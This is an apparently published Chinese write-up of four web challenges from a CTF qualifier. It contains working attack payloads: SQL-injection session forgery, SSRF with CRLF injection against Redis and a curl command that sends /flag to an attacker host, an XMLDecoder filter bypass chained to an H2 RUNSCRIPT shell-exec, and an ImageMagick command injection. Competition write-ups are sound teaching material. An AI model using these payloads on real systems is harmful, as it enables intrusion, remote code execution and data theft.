![](https://p2.ssl.qhimg.com/t019a4519fefd71c7a2.png)

3CTF初赛已经落下帷幕，题目类型包括理论题和CTF夺旗，CTF夺旗主要涉及Web安全、数据包分析、取证分析、隐写、加解密编码等内容；目前wp已出炉，让我们一起围观~

## 1、立誓要成为admin的男人

题目类型：Web

解题思路：

1.注册test用户，然后登陆，得到提示you are not admin；

![](https://p1.ssl.qhimg.com/t01c900f88199744aca.jpg)

2.回头看看，在登录处发现SQL盲注漏洞；

![](https://p5.ssl.qhimg.com/dm/1024_445_/t01b99f80dd3442bc6d.jpg)

![](https://p5.ssl.qhimg.com/dm/1024_580_/t01cfbb39d3aa814190.jpg)

3.注出了user表的数据但是admin的密码没法解密。数据库用户为root，尝试读取文件/etc/passwd；

![](https://p1.ssl.qhimg.com/dm/1024_493_/t018cbd798388e3e7f9.jpg)

4.可以读取文件，说明数据库root用户存在file权限。尝试读取站点文件

/var/www/html/index.php

![](https://p1.ssl.qhimg.com/dm/1024_94_/t014997a2c31ba65fd4.jpg)

5.读取站点文件失败，尝试往站点写入shell；

![](https://p4.ssl.qhimg.com/dm/1024_259_/t010c50db7ec58c7ab6.jpg)

6.访问404，没有写shell成功，说明mysql没有apache站点目录的可读可写权限。

7.扫描站点目录，发现test.php

![](https://p3.ssl.qhimg.com/dm/687_1024_/t013b0c017b030b1a87.jpg)

8.访问test.php，如果登录过，会打印当前的用户名，猜测为session；

![](https://p4.ssl.qhimg.com/t01cd8aa59d0145c331.jpg)

9\.
既然sql注入有file权限，那应该可以往/tmp目录写入文件。而session文件保存路径也在/tmp目录，参照test.php的格式构造session序列化字符串伪造成admin的身份，通过sql注入写入到/tmp目录中一个不存在的session文件。

![](https://p2.ssl.qhimg.com/dm/1024_249_/t010f9127deaa793338.jpg)

10.修改sessions id然后访问index.php，伪造admin用户成功，拿到了flag；

![](https://p2.ssl.qhimg.com/dm/1024_300_/t016c7f2d22941da063.jpg)

答案：flag{7d403b08fa188e5d1a208d07e90ad084}

## 2、用Python写的一个网站好像还没有写完？

题目类型：Web

解题思路：

1.打开网站，输入

<http://www.baidu.com>

并提交，发现显示百度页面。发现存在SSRF漏洞，测试发现只能使用http协议。

![](https://p2.ssl.qhimg.com/dm/1024_643_/t01291d3be9111a67b7.jpg)

2.查看请求头，发现服务器使用了nginx，后端python版本为3.6.5。

![](https://p4.ssl.qhimg.com/t011e08431a69473872.jpg)

3.猜测存在nginx目录穿越漏洞，访问

<http://127.0.0.1:8000/static../main.py>

可直接下载源码。

![](https://p4.ssl.qhimg.com/dm/961_1024_/t01910c0015b8e6ac8e.jpg)

4.通过源码可以看出，服务器对请求的URL进行了判断，只能请求[http://开头的。查找python历史漏洞，发现python3.6.5的urllib库存在http头注入漏洞。]()

<https://bugs.python.org/issue35906>

5\. 进行测试，确认存在http头注入漏洞：

![](https://p5.ssl.qhimg.com/dm/1024_288_/t01bbc937d9a57b7fd5.jpg)

![](https://p2.ssl.qhimg.com/dm/1024_80_/t010bde3275306a62b6.jpg)

6.所以该题的思路就为：利用http头注入，攻击内网redis，获取redis服务器权限。

7.借用

<https://github.com/Ridter/redis-rce/blob/master/redis-rce.py>

利用脚本，修改脚本为本地的redis-poc.py，且利用其中的mk_cmd函数进行命令的构造。

8.完整攻击步骤：

step 1, 开启恶意redis服务(附件下载)

    
    
    python redis-poc.py -r 127.0.0.1 -p 6379 -L 0.0.0.0 -P
    7789 -f exp.so 

step 2，设置redis的主服务器为恶意redis服务.

    
    
    auth password123                //
    
    *2%0d%0a$4%0d%0aauth%0d%0a$11%0d%0apassword123%0d%0a
    
    SL**EOF 192.168.21.1 7789       //
    
    *3%0d%0a$7%0d%0aSL**EOF%0d%0a$12%0d%0a192.168.21.1%0d%0a$4%0d%0a7789%0d%0a
    
    CONFIG SET dbfilename exp.so    //
    
    *4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$6%0d%0aexp.so%0d%0a
    
    curl http://127.0.0.1:8000/ -XPOST --data
    
    'url=http://redis-server:6379/%0d%0a%0d%0a*2%0d%0a$4%0d%0aauth%0d%0a$11%0d%0apassword123%0d%0a%0d%0a*3%0d%0a$7%0d%0aSL**EOF%0d%0a$12%0d%0a192.168.21.1%0d%0a$4%0d%0a7789%0d%0a%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$6%0d%0aexp.so%0d%0a'

![](https://p4.ssl.qhimg.com/dm/1024_319_/t01f939075c2643a39d.jpg)

![](https://p0.ssl.qhimg.com/dm/1024_153_/t01b48a63536c44adcf.jpg)

step 3 加载恶意模块

    
    
    auth password123                //
    
    *2%0d%0a$4%0d%0aauth%0d%0a$11%0d%0apassword123%0d%0a
    
    MODULE LOAD ./exp.so            //
    
    *3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a
    
    SL**EOF NO ONE                  //
    
    *3%0d%0a$7%0d%0aSL**EOF%0d%0a$2%0d%0aNO%0d%0a$3%0d%0aONE%0d%0a
    
    curl http://127.0.0.1:8000/ -XPOST --data 'url=http://redis-server:6379/%0d%0a%0d%0a*2%0d%0a$4%0d%0aauth%0d%0a$11%0d%0apassword123%0d%0a%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$4%0d%0aLOAD%0d%0a$8%0d%0a./exp.so%0d%0a%0d%0a*3%0d%0a$7%0d%0aSL**EOF%0d%0a$2%0d%0aNO%0d%0a$3%0d%0aONE%0d%0a%0d%0a'

![](https://p3.ssl.qhimg.com/dm/1024_130_/t01fae0199d284c3570.jpg)

step 4 执行命令，因为无回显，所以利用curl命令把flag文件传输出去

    
    
    auth password123                //
    
    *2%0d%0a$4%0d%0aauth%0d%0a$11%0d%0apassword123%0d%0a
    
    system.exec 'curl -F "file=@/flag"
    
    http://192.168.21.1:7789'    //
    
    *2%0d%0a$11%0d%0asystem.exec%0d%0a$46%0d%0acurl%20-F%20%22file=@/flag%22%20http://192.168.21.1:7789%0d%0a
    
    curl http://127.0.0.1:8000/ -XPOST --data
    
    'url=http://redis-server:6379/%0d%0a%0d%0a*2%0d%0a$4%0d%0aauth%0d%0a$11%0d%0apassword123%0d%0a%0d%0a*2%0d%0a$11%0d%0asystem.exec%0d%0a$46%0d%0acurl%20-F%20%22file=@/flag%22%20http://192.168.21.1:7789%0d%0a'

![](https://p0.ssl.qhimg.com/dm/1024_134_/t01158764272e4f454d.jpg)

![](https://p0.ssl.qhimg.com/dm/1024_418_/t0112a164f19faa7979.jpg)

step 5 删除恶意模块，关闭恶意模块。

    
    
    auth password123                //
    
    *2%0d%0a$4%0d%0aauth%0d%0a$11%0d%0apassword123%0d%0a
    
    CONFIG SET dbfilename dump.rdb  //
    
    *4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$8%0d%0adump.rdb%0d%0a
    
    system.exec 'rm ./exp.so'       //
    
    *2%0d%0a$11%0d%0asystem.exec%0d%0a$11%0d%0arm%20./exp.so%0d%0a
    
    MODULE UNLOAD system            //
    
    *3%0d%0a$6%0d%0aMODULE%0d%0a$6%0d%0aUNLOAD%0d%0a$6%0d%0asystem%0d%0a
    
    curl http://127.0.0.1:8000/ -XPOST --data 'url=http://redis-server:6379/%0d%0a%0d%0a*2%0d%0a$4%0d%0aauth%0d%0a$11%0d%0apassword123%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$8%0d%0adump.rdb%0d%0a%0d%0a*2%0d%0a$11%0d%0asystem.exec%0d%0a$11%0d%0arm%20./exp.so%0d%0a%0d%0a*3%0d%0a$6%0d%0aMODULE%0d%0a$6%0d%0aUNLOAD%0d%0a$6%0d%0asystem%0d%0a%0d%0a

## 3、最近在学习编程，这是我刚开发的博客，你能找到问题么？

题目类型：Web

解题思路：

1.首先打开网站，在测试注册功能的时候在前端可以看到如下的代码：

![](https://p1.ssl.qhimg.com/dm/1024_605_/t018544974ac0ff05dd.jpg)

2.因此猜测后端有XMLDecoder的反序列化漏洞。于是进行尝试，首先根据获取到的源码解压然后反编译可以得到如下：

![](https://p5.ssl.qhimg.com/dm/1024_653_/t01436a621ee7cc7ef9.jpg)

3.其中的重点是使用了XMLDecodeFilter这个类将前端传入的数据执行了反序列化处理，根据导入包的关系找到

XMLDecodeFilter这个类，定义如下：

![](https://p3.ssl.qhimg.com/dm/1024_250_/t012f32f8c7f5de9316.jpg)

4.该类的readObject方法是直接调用XMLDecoder的readObject方法的，但是这里如果仅仅如此的话，那就丝毫没有难度了，因此向上找可以看到一个构造器：

![](https://p0.ssl.qhimg.com/dm/1024_441_/t01c33daebfb9afaefd.jpg)

5.可以看到其中会多进行一步validate函数的处理，根据函数名称来猜测这里是过滤方法，跟进可以看到如下：

![](https://p2.ssl.qhimg.com/dm/1024_610_/t01cec322267d344eab.jpg)

6.果然是过滤方法，这里的过滤让我想起了weblogic的过滤，梳理一下得到如下结果：

(1)过滤了class标签

(2)过滤了new标签

(3)过滤了method标签

(4)void标签中只允许使用index属性

(5)object标签只允许使用class属性，并且限制了属性可以调用 的类

(6)限制了array标签length的最大长度

7.打开XMLDecoder的类发现基本没有可用的标签了，但是还剩下三个。java, field和property。

![](https://p5.ssl.qhimg.com/t014fb9600ec7eb4dab.jpg)

![](https://p0.ssl.qhimg.com/dm/1024_325_/t01c87fcc2939a4b4eb.jpg)

8.其中java标签没法使用，剩下的这两个标签，官方描述信息如下：

参考的链接地址：

https://docs.oracle.com/javase/9/docs/api/java/beans/XMLEncoder.html

9.这里可以得到的一个有价值的信息是，property可以调用一个类的getter和setter。因此利用这个可以做很多事情，比如利用fastjson，Jackson漏洞的利用链等。

10.另外一个标签field需要简单去读一下代码，可以发现主要的功能是可以对类的静态字段进行写操作。

11\.
进行到这里，思路就成了，如何找到一个类，通过调用它的getter和setter方法实现命令执行？property标签在调用一个类的getter和setter方法的时候是没有类似name的属性可以直接去指定是哪个类的，因此外层就只能够通过field标签来得到“那个对象”了。但是field只能设置静态字段，怎么利用呢？

12.此时可以看到代码的pom.xml的依赖库描述文件中有提示信息如下：

![](https://p5.ssl.qhimg.com/t01a0181196aa12d6a5.jpg)

13.于是重点关注了一下这个包，现在需要思考的是，需要在这个包中找到一个类，有一个public的静态字段，该字段的类型的类中需要有一个合适的getter和setter，getter的返回类型为class，setter的参数表为String类型，这样串联起来，可以首先通过field标签调用该类的静态字段对象的setter，然后再去使用property的getter来获得到一个类。然后再去调用得到类的getter和setter就可以实现利用了！

14.找到的类如下：

![](https://p4.ssl.qhimg.com/dm/1024_466_/t0176dcf5673a81f907.jpg)

15.该类中的ST_ANY_TYPE满足public static，类型为SchemaTypeImpl， 跟进：

![](https://p5.ssl.qhimg.com/dm/1024_395_/t01fe63ae95feb90481.jpg)

16.然后getter如下：

![](https://p1.ssl.qhimg.com/dm/1024_327_/t01a952dce6e2318480.jpg)

17.首先通过setFullJavaName可以设置_fullJavaName的值，然后调用getJavaClass方法的时候将会利用类加载加载到该类。写出来利用代码如下：

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    
    <java version="1.8.0_211"
    
    class="java.beans.XMLDecoder">
    
    <field id="publicStaticField" name="ST_ANY_TYPE"
    
    class="org.apache.xmlbeans.impl.schema.BuiltinSchemaTypeSystem">
    
    <property id="propertySet" name="fullJavaName">
    
                <string>你需要的类</string>
    
            </property>
    
        </field>
    
        <var id="evilClass" idref="publicStaticField">
    
            <property id="propertyGet" name="javaClass">
    
                <void>
    
                这里可以调用这个类的构造器或者是getter和setter来实现命令执行
    
                </void>
    
            </property>
    
        </var>
    
    </java>

18.接下来就是所需要Gadgets的选择问题了：

依赖库中使用了h2数据库，并且spring
boot的默认依赖库中有日志记录的包logback。因此可以利用之前Jackson出现过的那个绕过。当然还可以利用jndi注入，类似fastjson的利用链。但是那些利用链需要jdk
版本较低，而目标环境较高，因此至此只能做罢。

19.最终的利用代码如下：

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    
    <java version="1.8.0_211"
    
    class="java.beans.XMLDecoder">
    
        <field id="publicStaticField" name="ST_ANY_TYPE" class="org.apache.xmlbeans.impl.schema.BuiltinSchemaTypeSystem">
    
    <property id="propertySet" name="fullJavaName">
    
                <string>ch.qos.logback.core.db.DriverManagerConnectionSource</string>
    
            </property>
    
        </field>
    
        <var id="evilClass" idref="publicStaticField">
    
            <property id="propertyGet" name="javaClass">
    
                <void>
    
                    <property name="url">
    
                        <string>jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INI
    
    T=RUNSCRIPT FROM
    
    'http://localhost:8000/exec.sql'</string>
    
                    </property>
    
                    <property name="connection">
    
                        <void></void>
    
                    </property>
    
                </void>
    
            </property>
    
        </var>
    
    </java>

exec.sql文件内容：

    
    
    CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
    
        String[] command = {"/bin/bash", "-c", cmd};
    
        java.util.Scanner s = new
    
    java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\A");
    
        return s.hasNext() ? s.next() : "";  }
    
    $$;
    
    CALL SHELLEXEC('touch /tmp/123')

文章中所使用测试工具下载：

https://yunpan.360.cn/surl_yuRH7HVwvwj

（提取码：b528）

## 4、真实的环境中，充满了未知，漏洞与函数的拼接，能否绕过？

题目类型：web

解题思路：

1.打开web站点，是一个登陆页面，需要进行爆破来登陆进去，通过爆破得到账号密码：

admin/1qaz@WSX

![](https://p2.ssl.qhimg.com/dm/1024_519_/t0196ff40c79ef81b0f.jpg)

2.登陆成功以后为一个上传点，f12会提示一些内容：

![](https://p0.ssl.qhimg.com/dm/1024_478_/t01ff6132254166fbe1.jpg)

根据图片大小，想到getimagesize函数。

3.利用imagemagick+getimagesize 进行代码执行漏洞

具体漏洞原理可参考：

https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html#0x03-getimagesizeimagemagickpoc

payload：

    
    
    push graphic-context
    
    viewbox 0 0 640 480
    
    fill 'url(https://127.0.0.0/oops.jpg"|"`id`)'
    
    pop graphic-context
    
    #define xlogo_width 200
    
    #define xlogo_height 200

4.利用curl将shell get

到/var/www/images 目录下，读取flag文件。

![](https://p3.ssl.qhimg.com/dm/1024_473_/t010cf6131b2773dbe9.jpg)

如果你想展示你的CTF能力，我们提供给你机会，平台近期开始向社会征集CTF题目，题目类型不限制，奖励丰厚，有想法的大佬可以联系

university@360.cn。

  

